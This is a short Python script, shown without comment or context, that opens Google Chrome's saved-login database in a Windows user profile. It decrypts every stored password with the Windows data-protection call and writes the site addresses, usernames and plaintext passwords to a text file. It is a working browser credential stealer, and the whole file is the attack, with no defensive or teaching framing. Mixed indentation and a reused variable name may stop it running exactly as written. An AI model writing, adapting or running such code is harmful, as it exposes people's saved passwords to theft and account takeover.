import sqlite3
import os

try:
    import win32crypt
except:
    pass

path = os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'

info = []

con = sqlite3.connect(path + "Login Data")
with con:
    cursor = con.cursor()
    v = cursor.execute(
        'SELECT action_url, username_value, password_value FROM logins')
    val = v.fetchall()
cred={}
for orgin_url, username, password in val:
        password = win32crypt.CryptUnprotectData(password, None, None, None, 0)

	cred[orgin_url]=(username,password[1])

with open('Password.txt', 'w') as f:
     for url, cred in cred.iteritems():
            if cred[1]:
                f.write("\n" + url + "\n" + cred[0].encode('utf-8') + " | " + cred[1] + "\n")
				


